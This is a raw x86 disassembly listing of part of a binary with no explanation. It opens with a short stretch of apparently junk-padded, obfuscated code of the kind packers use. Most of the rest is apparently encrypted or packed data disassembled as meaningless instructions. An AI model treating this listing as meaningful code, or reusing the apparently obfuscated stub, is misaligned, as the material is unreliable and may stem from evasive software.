  414161:	and    DWORD PTR ds:0x42fcd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fcd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fcd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x41427f
  414283:	test   al,0xf4
  414285:	fld    DWORD PTR [eax-0x468f8f8d]
  41428b:	jle    0x4142fd
  41428d:	jo     0x41423d
  41428f:	sbb    eax,DWORD PTR [eax-0x65]
  414292:	adc    al,0xbd
  414294:	mov    es,WORD PTR [ecx+0x33bbf159]
  41429a:	cli    
  41429b:	inc    eax
  41429c:	cs inc esi
  41429e:	mov    edi,0xfd52b3fe
  4142a3:	fnsave [ebx+0x1ba2157b]
  4142a9:	inc    edi
  4142aa:	aaa    
  4142ab:	mov    cl,0x5d
  4142ad:	cmp    al,0xb0
  4142af:	adc    bl,BYTE PTR [ebx]
  4142b1:	inc    ebp
  4142b2:	enter  0x92d6,0x29
  4142b6:	jg     0x41430c
  4142b8:	push   edx
  4142b9:	push   ss
  4142ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142bb:	sbb    al,0x5c
  4142bd:	das    
  4142be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142bf:	loopne 0x414281
  4142c1:	aas    
  4142c2:	mov    ebx,DWORD PTR [edx]
  4142c4:	pusha  
  4142c5:	imul   esp,DWORD PTR [edi+ebp*4+0x7c94fada],0x5d3dec8a
  4142d0:	lock aas 
  4142d2:	xchg   BYTE PTR [ecx+ebp*4],ch
  4142d5:	mov    DWORD PTR [eax-0x7d],esp
  4142d8:	adc    BYTE PTR [ecx+esi*1+0xeec95ae],al
  4142df:	inc    ebp
  4142e0:	hlt    
  4142e1:	cmp    eax,0xac3ec6f2
  4142e6:	jmp    0x41435e
  4142e8:	ret    0x4213
  4142eb:	mov    bl,0xf4
  4142ed:	cmp    eax,0x6101b5e2
  4142f2:	int    0xa8
  4142f4:	mov    al,0x96
  4142f6:	das    
  4142f7:	outs   dx,DWORD PTR ds:[esi]
  4142f8:	cdq    
  4142f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142fa:	push   ebp
  4142fb:	adc    BYTE PTR [ebx*8+0x5ab7ff],bl
  414302:	cmp    esi,DWORD PTR [ecx-0x40]
  414305:	add    al,0xae
  414307:	arpl   WORD PTR [ebp-0x57],bp
  41430a:	leave  
  41430b:	imul   edx,DWORD PTR [ebp+edi*8-0x51d1964a],0x3a
  414313:	push   es
  414314:	loopne 0x4142dd
  414316:	leave  
  414317:	add    esi,DWORD PTR [edx+ebx*1+0x44]
  41431b:	repnz (bad) [eax-0x51]
  41431f:	icebp  
  414320:	xchg   edi,eax
  414321:	mov    cs,edx
  414323:	mov    ch,0x2c
  414325:	bound  ebx,QWORD PTR [ecx-0x2b128121]
  41432b:	ds cmp eax,0xe2eeb730
  414331:	repz adc DWORD PTR ds:[ecx+esi*4-0x1ef3ff04],ebx
  41433a:	adc    al,0x7c
  41433c:	xchg   esp,eax
  41433d:	and    eax,0xd54afc20
  414342:	fld    TBYTE PTR [ecx-0x5]
  414345:	rcr    BYTE PTR [esi+0x1a],1
  414348:	test   eax,0xf879ef93
  41434d:	ret    
  41434e:	xchg   edi,eax
  41434f:	jnp    0x4142d5
  414351:	jno    0x414368
  414353:	mov    ds:0x13dc6cb8,al
  414358:	pop    ds
  414359:	jo     0x41431e
  41435b:	sub    ebp,DWORD PTR [ebp+0x58]
  41435e:	push   0x15
  414360:	pop    ss
  414361:	fwait
  414362:	sub    eax,0xc56302d8
  414367:	mov    bh,0xf
  414369:	js     0x4143e5
  41436b:	fist   DWORD PTR [esi-0x3d]
  41436e:	push   ecx
  41436f:	cwde   
  414370:	mov    eax,0x87cf2981
  414375:	imul   esi,esi,0xffffffa4
  414378:	cmp    al,0x2b
  41437a:	(bad)  
  41437b:	mov    bl,0xd5
  41437d:	push   0x23
  41437f:	aam    0x8
  414381:	mov    al,0x3c
  414383:	and    al,0xed
  414385:	mov    dl,BYTE PTR [esi+0x1014c29d]
  41438b:	adc    BYTE PTR [esp+eax*2+0x2f6ff693],cl
  414392:	xchg   ebx,eax
  414393:	ficom  WORD PTR [edi+0x216393ea]
  414399:	(bad)  
  41439a:	cwde   
  41439b:	test   ebx,esp
  41439d:	sbb    DWORD PTR [edi],eax
  41439f:	out    dx,al
  4143a0:	es xchg edx,eax
  4143a2:	fwait
  4143a3:	wbinvd 
  4143a5:	mov    eax,ds:0x614bd34
  4143ab:	jg     0x414426
  4143ad:	mov    cl,0xf8
  4143af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143b0:	or     eax,DWORD PTR [ecx]
  4143b2:	out    0x23,al
  4143b4:	pop    ss
  4143b5:	repz cmc 
  4143b7:	bound  edx,QWORD PTR [edx]
  4143b9:	inc    ebx
  4143ba:	pop    ebx
  4143bb:	add    DWORD PTR [ebx],0x8573ea8
  4143c1:	inc    esp
  4143c2:	mov    cl,0x66
  4143c4:	pop    DWORD PTR [bp+si+0x5e]
  4143c8:	(bad)  
  4143c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143ca:	and    DWORD PTR ds:0xf374ead1,esi
  4143d0:	sar    DWORD PTR [ecx],cl
  4143d2:	adc    BYTE PTR [esi+0x4a85f8a2],al
  4143d8:	es sbb eax,0xfadd2cac
  4143de:	or     eax,0xbe7dfdc4
  4143e3:	scas   eax,DWORD PTR es:[edi]
  4143e4:	xchg   esi,eax
  4143e5:	inc    ebp
  4143e6:	and    bh,BYTE PTR [ecx]
  4143e8:	sbb    BYTE PTR [edi+0x3ef5862e],bh
  4143ee:	add    al,0xb9
  4143f0:	or     BYTE PTR [edx],cl
  4143f2:	ret    0xc9dc
  4143f5:	sahf   
  4143f6:	nop
  4143f7:	dec    ebx
  4143f8:	mov    bl,0xfd
  4143fa:	cmp    eax,0x7bebe417
  4143ff:	adc    bl,BYTE PTR [edi+0x4f]
  414402:	(bad)  
  414403:	clc    
  414404:	mov    bl,0xcb
  414406:	sbb    bh,BYTE PTR [edx+0x7f]
  414409:	jno    0x4143d5
  41440b:	into   
  41440c:	cmp    ebp,eax
  41440e:	(bad)  
  41440f:	sbb    BYTE PTR [eax],dh
  414411:	pop    ds
  414412:	repnz daa 
  414414:	ins    BYTE PTR es:[edi],dx
  414415:	or     BYTE PTR [ebx+0x3a3a8245],ah
  41441b:	in     al,dx
  41441c:	iret   
  41441d:	cs mov al,0x72
  414420:	xchg   ebp,esi
  414422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414423:	inc    ebp
  414424:	outs   dx,DWORD PTR ds:[esi]
  414425:	jae    0x4143b7
  414427:	fcom   st(6)
  414429:	push   cs
  41442a:	xor    al,0x9d
  41442c:	xchg   DWORD PTR [eax+0x2e],edx
  41442f:	das    
  414430:	pop    ss
  414431:	sbb    DWORD PTR [edi],ecx
  414433:	add    BYTE PTR [edx+0x61],dl
  414436:	sahf   
  414437:	dec    eax
  414438:	fs dec esi
  41443a:	jecxz  0x4143f7
  41443c:	mov    eax,0xa48ecd83
  414441:	mov    bh,ah
  414443:	test   cl,bh
  414445:	loopne 0x414416
  414447:	dec    edi
  414448:	lods   eax,DWORD PTR cs:[esi]
  41444a:	ins    BYTE PTR es:[edi],dx
  41444b:	outs   dx,BYTE PTR ds:[esi]
  41444c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41444d:	ror    BYTE PTR [ebx],cl
  41444f:	imul   esp,DWORD PTR [edi+eiz*1+0x2078be00],0xbfc5a2fc
  41445a:	into   
  41445b:	icebp  
  41445c:	jecxz  0x41445b
  41445e:	inc    esi
  41445f:	sahf   
  414460:	xchg   ebp,eax
  414461:	jmp    0xfcf81809
  414466:	and    eax,ebp
  414468:	push   cs
  414469:	je     0x414489
  41446b:	add    eax,0xc5051675
  414470:	pop    ss
  414471:	xor    bh,BYTE PTR [edi]
  414473:	loope  0x41444f
  414475:	scas   al,BYTE PTR es:[edi]
  414476:	stos   DWORD PTR es:[edi],eax
  414477:	pop    eax
  414478:	sar    BYTE PTR ds:0x61fb22df,cl
  41447e:	mov    ebp,0x8299c8f5
  414483:	sub    DWORD PTR [edx+0x5837989c],0xb4fdeda9
  41448d:	cmp    al,0x42
  41448f:	jecxz  0x4144b8
  414491:	sub    BYTE PTR [edx],dh
  414493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414494:	stos   BYTE PTR es:[edi],al
  414495:	js     0x4144f0
  414497:	xor    eax,0xcecfa011
  41449c:	cmp    eax,0xfd34a26f
  4144a1:	mov    es,WORD PTR [esi-0x3f0354db]
  4144a7:	jmp    FWORD PTR [ecx+ebx*8+0x2a]
  4144ab:	push   cs
  4144ac:	fwait
  4144ad:	sbb    eax,0x359d93e0
  4144b2:	sbb    DWORD PTR [esi-0x50],edx
  4144b5:	nop
  4144b6:	scas   al,BYTE PTR es:[edi]
  4144b7:	fnsave [edi]
  4144b9:	xchg   esp,eax
  4144ba:	mov    ecx,0x9d356757
  4144bf:	xadd   DWORD PTR ds:0x658d98ac,edi
  4144c6:	push   dx
  4144c8:	cmp    dh,0x31
  4144cb:	leave  
  4144cc:	neg    BYTE PTR [esi+0x5]
  4144cf:	mov    cl,0xf
  4144d1:	sbb    DWORD PTR [edi],esi
  4144d3:	jb     0x4144c1
  4144d5:	retf   0x30c8
  4144d8:	loope  0x414517
  4144da:	repnz test ah,cl
  4144dd:	push   edi
  4144de:	ins    DWORD PTR es:[edi],dx
  4144df:	mov    dh,BYTE PTR [ebx+edx*2]
  4144e2:	std    
  4144e3:	mov    cl,0x35
  4144e5:	adc    ch,BYTE PTR [edx-0x3145bbb4]
  4144eb:	shl    BYTE PTR [ebx+0x44],cl
  4144ee:	cdq    
  4144ef:	popa   
  4144f0:	sbb    eax,0x72d9196e
  4144f5:	lea    eax,[edx+0x36aca40]
  4144fb:	retf   0x93bf
  4144fe:	pop    ebp
  4144ff:	(bad)  
  414500:	ds aad 0xec
  414503:	pop    es
  414504:	mov    edi,0x29cb22de
  414509:	pop    esp
  41450a:	xchg   esi,eax
  41450b:	adc    BYTE PTR [eax+0x337b4ded],0xca
  414512:	aam    0x9c
  414514:	jecxz  0x414571
  414516:	mov    ah,0x21
  414518:	xrelease xchg BYTE PTR [ebp+edi*2+0x3a1317ee],bl
  414520:	sbb    DWORD PTR [ebp-0x63],ebp
  414523:	cmc    
  414524:	xchg   ebx,eax
  414525:	mov    bh,0x2
  414527:	push   ebp
  414528:	outs   dx,BYTE PTR ds:[esi]
  414529:	push   edi
  41452a:	stos   DWORD PTR es:[edi],eax
  41452b:	pop    ss
  41452c:	out    dx,al
  41452d:	inc    edx
  41452e:	jg     0x414570
  414530:	pop    esi
  414531:	aad    0x26
  414533:	cmp    esp,DWORD PTR [ebp+ebx*8+0x22193c8c]
  41453a:	inc    edi
  41453b:	mov    BYTE PTR [ecx-0x65],dh
  41453e:	dec    DWORD PTR [ecx]
  414540:	std    
  414541:	ja     0x414520
  414543:	mov    al,ds:0xbf62eb3
  414548:	imul   esi,DWORD PTR [edi],0x2670f36b
  41454e:	jo     0x414556
  414550:	mov    bh,0xa9
  414552:	(bad)  
  414554:	push   ebx
  414555:	push   DWORD PTR [ebp-0x30]
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xea25beb4
  414576:	xchg   esp,eax
  414577:	fcmovne st,st(1)
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x41458b
  414581:	(bad)  [ebx+0x4d]
  414584:	jns    0x4145bc
  414586:	dec    esi
  414587:	pminsw mm2,QWORD PTR [ebx-0x4ba99791]
  41458e:	jmp    0x5e5a:0x838a1a7b
  414595:	mov    bl,BYTE PTR [edi-0x36]
  414598:	mov    ch,0xe6
  41459a:	icebp  
  41459b:	cld    
  41459c:	pop    edx
  41459d:	scas   al,BYTE PTR es:[edi]
  41459e:	jp     0x4145df
  4145a0:	inc    ebp
  4145a1:	cld    
  4145a2:	retf   
  4145a3:	idiv   ebp
  4145a5:	xchg   esp,eax
  4145a6:	cmp    ecx,DWORD PTR [edx]
  4145a8:	fld    DWORD PTR [esi+0xb697524]
  4145ae:	pop    ecx
  4145af:	mov    ch,0x3a
  4145b1:	push   es
  4145b2:	test   eax,0x9fe29397
  4145b7:	xlat   BYTE PTR ds:[ebx]
  4145b8:	sbb    DWORD PTR [esi+0x35],eax
  4145bb:	xchg   ebx,eax
  4145bc:	xchg   ebp,eax
  4145bd:	mov    dl,dh
  4145bf:	xlat   BYTE PTR ds:[ebx]
  4145c0:	repz jle 0x414610
  4145c3:	add    DWORD PTR [esi-0x30],esp
  4145c6:	mov    al,ds:0x7c4335df
  4145cb:	test   eax,0x85de02e
  4145d0:	mov    eax,0xb2c5d656
  4145d5:	jo     0x414559
  4145d7:	or     BYTE PTR [edi*8-0x748fc27d],ah
  4145de:	call   0x7b37b47
  4145e3:	xor    eax,0x302e60d5
  4145e8:	addr16 ret 0x3bba
  4145ec:	xchg   ebx,eax
  4145ed:	pusha  
  4145ee:	icebp  
  4145ef:	inc    ebx
  4145f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145f1:	cmp    DWORD PTR gs:[eax-0x53],esi
  4145f5:	int3   
  4145f6:	dec    ebx
  4145f7:	inc    ebx
  4145f8:	dec    edi
  4145f9:	adc    DWORD PTR [ebp+edi*4+0x2a],esp
  4145fd:	mov    ah,0xce
  4145ff:	jp     0x41459a
  414601:	xor    ecx,DWORD PTR [ebx-0x4f07aa3f]
  414607:	push   eax
  414608:	push   ecx
  414609:	arpl   WORD PTR [esi+0x659f2c24],cx
  41460f:	mov    DWORD PTR [ebx+esi*4],ebx
  414612:	ret    0xdb32
  414615:	xchg   DWORD PTR [esi-0x77],ebp
  414618:	adc    dl,BYTE PTR [eax-0x5e]
  41461b:	ja     0x414651
  41461d:	fbstp  TBYTE PTR [eax+0x37]
  414620:	xchg   edx,eax
  414621:	fdivr  st,st(2)
  414623:	push   ebx
  414624:	gs xchg edi,eax
  414626:	push   edi
  414627:	ror    ah,cl
  414629:	imul   ebx,DWORD PTR [ecx-0x4e040fb],0xe29375b5
  414633:	push   ecx
  414634:	xchg   DWORD PTR [ebx-0x6e47b839],edi
  41463a:	outs   dx,BYTE PTR ds:[esi]
  41463b:	add    al,0x92
  41463d:	mov    ah,0xb2
  41463f:	nop
  414640:	and    BYTE PTR [ecx-0x7e8fe41a],ah
  414646:	inc    esi
  414647:	xchg   edx,eax
  414648:	mov    ds:0xc4ab6bb8,al
  41464d:	cs mov esp,0xf9a5e237
  414653:	stc    
  414654:	jl     0x4146c1
  414656:	sub    eax,0xc3172e3c
  41465b:	je     0x4146cd
  41465d:	dec    eax
  41465e:	stos   BYTE PTR es:[edi],al
  41465f:	inc    edi
  414660:	test   esi,0x768f1e4a
  414666:	mov    esp,0xb2db3dad
  41466b:	call   0x975ee03f
  414670:	call   0xd91b660b
  414675:	int    0xd9
  414677:	shl    DWORD PTR [esi-0x226ab264],0xe
  41467e:	xor    BYTE PTR [edx+0x17],dh
  414681:	cdq    
  414682:	ja     0x4146e1
  414684:	mov    cl,0x8e
  414686:	shr    DWORD PTR [esp+ebp*1],0x8c
  41468a:	fwait
  41468b:	jmp    0x4146bd
  41468d:	xor    bh,al
  41468f:	nop
  414690:	add    ch,dl
  414692:	mov    ebx,0x28e04f97
  414697:	sbb    cl,BYTE PTR [esi+ebp*2+0x481e9352]
  41469e:	iret   
  41469f:	add    DWORD PTR [ecx+0x1a],ebx
  4146a2:	aaa    
  4146a3:	pop    es
  4146a4:	push   esp
  4146a5:	push   edi
  4146a6:	ja     0x4146cf
  4146a8:	mov    DWORD PTR [edi],ecx
  4146aa:	mov    esi,0x3a5b84ba
  4146af:	jge    0x4146ef
  4146b1:	sub    al,0xbb
  4146b3:	mov    ecx,0xf5a04326
  4146b8:	test   al,0x23
  4146ba:	in     eax,0x45
  4146bc:	mov    edi,0xb4f15f04
  4146c1:	mov    eax,0x8a511abc
  4146c6:	out    dx,eax
  4146c7:	and    edi,DWORD PTR [ebx]
  4146c9:	sub    al,0x23
  4146cb:	idiv   BYTE PTR [edi+eiz*1+0x48]
  4146cf:	and    cl,ch
  4146d1:	sub    DWORD PTR [edx-0x237dcea9],esi
  4146d7:	inc    eax
  4146d8:	adc    BYTE PTR [edi-0x2e],ch
  4146db:	sbb    ebx,DWORD PTR [edx]
  4146dd:	fdiv   QWORD PTR [ebx+0x4b]
  4146e0:	cmp    DWORD PTR [eax],edi
  4146e2:	xchg   edi,eax
  4146e3:	xchg   ebx,eax
  4146e4:	push   0xb0f85cff
  4146e9:	sub    DWORD PTR [ecx-0x45],ecx
  4146ec:	jo     0x4146f0
  4146ee:	pop    eax
  4146ef:	mov    eax,0x1bd1a76e
  4146f4:	sbb    dh,BYTE PTR [edx+0x5586b00c]
  4146fa:	mov    dh,0x6d
  4146fc:	add    BYTE PTR [ebp+0x192b0a0b],bh
  414702:	test   BYTE PTR [ebx+0x50],al
  414705:	lds    ebp,FWORD PTR [ecx-0x90bb3a5]
  41470b:	mov    ds,WORD PTR [ebx]
  41470d:	(bad)  
  41470e:	dec    edi
  41470f:	(bad)  
  414710:	dec    eax
  414711:	scas   al,BYTE PTR es:[edi]
  414712:	pop    ss
  414713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414714:	(bad)  
  414715:	ins    BYTE PTR es:[edi],dx
  414716:	gs push ebx
  414718:	jmp    0x292610e6
  41471d:	in     al,0xd6
  41471f:	sti    
  414720:	shl    DWORD PTR [ebx+0x3e876458],1
  414726:	or     dh,dh
  414728:	std    
  414729:	les    ebx,FWORD PTR [ecx+esi*1-0x12]
  41472d:	into   
  41472e:	inc    ecx
  41472f:	aas    
  414730:	xor    al,0xc4
  414732:	pop    eax
  414733:	mov    ds:0x157a1205,eax
  414738:	pop    ecx
  414739:	push   ecx
  41473a:	shl    DWORD PTR [ebp+0x55],1
  41473d:	xchg   esi,eax
  41473e:	add    BYTE PTR [edx-0x129d1ebe],ah
  414744:	int3   
  414745:	ins    DWORD PTR es:[edi],dx
  414746:	push   0x4c
  414748:	xchg   DWORD PTR [eax],esi
  41474a:	imul   esi,DWORD PTR [ebx+0x679b23d6],0x53fbbed2
  414754:	add    BYTE PTR [ebx],dh
  414756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414757:	mov    WORD PTR [ecx-0x5],ss
  41475a:	cmp    edx,DWORD PTR [ecx+0x7e3f9a3e]
  414760:	mov    ebx,DWORD PTR [ecx-0x80]
  414763:	fsin   
  414765:	sbb    DWORD PTR [edx],0x5d150bb9
  41476b:	and    bh,al
  41476d:	sar    BYTE PTR [edi-0x15],cl
  414770:	je     0x414782
  414772:	sub    dl,BYTE PTR [edi-0x43529376]
  414778:	cli    
  414779:	cmp    dh,BYTE PTR [esi+0x33]
  41477c:	mov    ebp,0x9ab7d25f
  414781:	push   0x1475ab4
  414786:	ins    DWORD PTR es:[edi],dx
  414787:	dec    esi
  414788:	xchg   esp,edx
  41478a:	adc    eax,0x789e8e
  41478f:	pop    ecx
  414790:	fcom   DWORD PTR [ebp-0x16]
  414793:	cdq    
  414794:	xor    BYTE PTR [edx-0x31],0x19
  414798:	fdiv   QWORD PTR [esi]
  41479a:	or     BYTE PTR [eax],dh
  41479c:	jmp    0x41473d
  41479e:	lods   al,BYTE PTR ds:[esi]
  41479f:	(bad)  
  4147a0:	fimul  DWORD PTR [edx-0x5c500d86]
  4147a6:	inc    edi
  4147a7:	pusha  
  4147a8:	cli    
  4147a9:	jns    0x414753
  4147ab:	dec    edx
  4147ac:	hlt    
  4147ad:	test   esi,edi
  4147af:	jno    0x414771
  4147b1:	out    0x87,al
  4147b3:	cwde   
  4147b4:	in     al,dx
  4147b5:	sub    DWORD PTR [edi],esi
  4147b7:	out    0xa5,eax
  4147b9:	mov    ch,0x1c
  4147bb:	test   DWORD PTR [esi+0xc],eax
  4147be:	sub    BYTE PTR cs:[eax-0x16],0x4f
  4147c3:	cmc    
  4147c4:	pop    ecx
  4147c5:	popf   
  4147c6:	jns    0x4147f2
  4147c8:	xor    ebx,DWORD PTR [eax]
  4147ca:	popa   
  4147cb:	fucom  st(1)
  4147cd:	dec    edx
  4147ce:	cmp    DWORD PTR [ecx+0xb],esi
  4147d1:	out    dx,al
  4147d2:	push   esp
  4147d3:	ret    0x50b1
  4147d6:	dec    esp
  4147d7:	shl    BYTE PTR [ebp+ecx*2+0x1fdf2d54],0xc8
  4147df:	sub    BYTE PTR [ebx+0x2f],dl
  4147e2:	pop    esi
  4147e3:	gs dec edi
  4147e5:	adc    bh,BYTE PTR [ecx]
  4147e7:	jmp    0x41477e
  4147e9:	iret   
  4147ea:	cs fs xchg esi,eax
  4147ed:	fwait
  4147ee:	cmp    al,0xa5
  4147f0:	test   eax,0xa1e45625
  4147f5:	sbb    DWORD PTR [ebp+0x61],0x54
  4147f9:	or     ebx,DWORD PTR gs:[edx+0x63]
  4147fd:	out    dx,eax
  4147fe:	loopne 0x41486f
  414800:	xchg   BYTE PTR [esi-0x455a66ee],dh
  414806:	addr16 push 0xffffff8d
  414809:	and    DWORD PTR [ebx],ecx
  41480b:	xchg   ecx,eax
  41480c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41480d:	aad    0xe5
  41480f:	retf   
  414810:	in     eax,dx
  414811:	sbb    DWORD PTR [ebp+0x4e],edi
  414814:	sbb    al,0x58
  414816:	jmp    0x414798
  414818:	aam    0x8a
  41481a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41481b:	adc    ah,bl
  41481d:	loop   0x41488d
  41481f:	inc    ebx
  414820:	fadd   st,st(3)
  414822:	mov    al,0x39
  414824:	jno    0x414840
  414826:	stc    
  414827:	push   ebx
  414828:	jl     0x4148a3
  41482a:	cmp    al,0x1a
  41482c:	scas   al,BYTE PTR es:[edi]
  41482d:	aad    0x5f
  41482f:	fdivr  QWORD PTR [edi-0x1dbe884b]
  414835:	dec    edi
  414836:	mov    BYTE PTR ds:0xf90e26f4,bl
  41483c:	jb     0x41483e
  41483e:	adc    cl,BYTE PTR [eax]
  414840:	mov    al,0x95
  414842:	mov    bl,0x1f
  414844:	fs leave 
  414846:	in     eax,0x8b
  414848:	dec    ebp
  414849:	clc    
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414896
  414861:	lds    ecx,FWORD PTR [edi]
  414863:	into   
  414864:	adc    bh,BYTE PTR [ebp+0x7f]
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x4147f4
  41486d:	push   0x3b
  41486f:	cmp    al,0xe3
  414871:	and    al,BYTE PTR [edx-0x7cef1ad1]
  414877:	sub    al,0x19
  414879:	add    eax,0xf9779a2b
  41487e:	push   edi
  41487f:	sbb    ebx,ebx
  414881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414882:	test   eax,0x756a8f5b
  414887:	pop    esp
  414888:	inc    esp
  414889:	xor    DWORD PTR [esi+eax*4],ebx
  41488c:	sub    eax,0x7414e056
  414891:	mov    DWORD PTR [ecx],ebx
  414893:	xchg   ebp,eax
  414894:	scas   al,BYTE PTR es:[edi]
  414895:	push   0xffffffbf
  414897:	hlt    
  414898:	es sub DWORD PTR es:[ebx+ebx*2],esi
  41489d:	fist   WORD PTR [edx]
  41489f:	test   BYTE PTR ds:0xb01db0de,bh
  4148a5:	dec    edi
  4148a6:	les    ecx,FWORD PTR [ecx-0x30]
  4148a9:	dec    ecx
  4148aa:	push   eax
  4148ab:	push   0x60b5dc74
  4148b0:	dec    eax
  4148b1:	rcr    BYTE PTR [eax],cl
  4148b3:	enter  0x8636,0xe8
  4148b7:	mov    ecx,esp
  4148b9:	lock adc al,0xe
  4148bc:	xor    eax,0xe40dfe48
  4148c1:	xor    DWORD PTR [esi+0x41],ebx
  4148c4:	or     edx,ebp
  4148c6:	test   DWORD PTR ds:0xef1f200,ebx
  4148cc:	add    DWORD PTR [edx-0x4af5415e],eax
  4148d2:	inc    esi
  4148d3:	in     al,0xe9
  4148d5:	dec    eax
  4148d6:	jns    0x414924
  4148d8:	ds dec ecx
  4148da:	jmp    ebx
  4148dc:	jl     0x4148dc
  4148de:	pop    ss
  4148df:	xor    eax,DWORD PTR [eax]
  4148e1:	pop    ebx
  4148e2:	leave  
  4148e3:	inc    ebx
  4148e4:	jmp    0x736c44
  4148e9:	popa   
  4148ea:	mov    ch,0x9f
  4148ec:	test   eax,0x490ab8c
  4148f1:	cmc    
  4148f2:	retf   
  4148f3:	push   ebx
  4148f4:	push   es
  4148f5:	jnp    0x414882
  4148f7:	xor    esi,DWORD PTR [edx+0x4a4ea14d]
  4148fd:	clc    
  4148fe:	fcomp  QWORD PTR [ecx]
  414900:	sub    ecx,eax
  414902:	rdmsr  
  414904:	cmp    eax,0x67231970
  414909:	lock xor esi,DWORD PTR [ebx+ecx*4+0x6c798d76]
  414911:	or     eax,0xf6e1df95
  414916:	mov    dh,0x5a
  414918:	js     0x414962
  41491a:	or     ah,BYTE PTR [ebp+0x4f]
  41491d:	jns    0x4148fc
  41491f:	sub    al,0xd3
  414921:	icebp  
  414922:	ss xchg ebp,esp
  414925:	cmc    
  414926:	retf   
  414927:	pop    ss
  414928:	dec    esi
  414929:	inc    edx
  41492a:	cmp    esi,DWORD PTR [eiz*1-0x1c90abb6]
  414931:	and    al,0x7
  414933:	(bad)  
  414934:	push   eax
  414935:	mov    WORD PTR [edx],cs
  414937:	inc    esi
  414938:	stos   BYTE PTR es:[edi],al
  414939:	loope  0x414965
  41493b:	mov    al,0xc7
  41493d:	into   
  41493e:	aam    0x31
  414940:	or     eax,0x1a86bf40
  414945:	bound  edx,QWORD PTR [esi+eiz*2+0x23]
  414949:	sbb    al,0xb7
  41494b:	cmp    ecx,ecx
  41494d:	xor    eax,0xdb8b1a54
  414952:	and    esi,DWORD PTR [eax+0x6985c2a4]
  414958:	or     esi,DWORD PTR ds:0x37bda0f7
  41495e:	jge    0x4149c5
  414960:	jbe    0x4149c6
  414962:	push   esi
  414963:	dec    eax
  414964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414965:	jne    0x41494a
  414967:	mov    edi,0xa88cefd7
  41496c:	pop    es
  41496d:	push   cs
  41496e:	arpl   di,di
  414970:	xchg   eax,eax
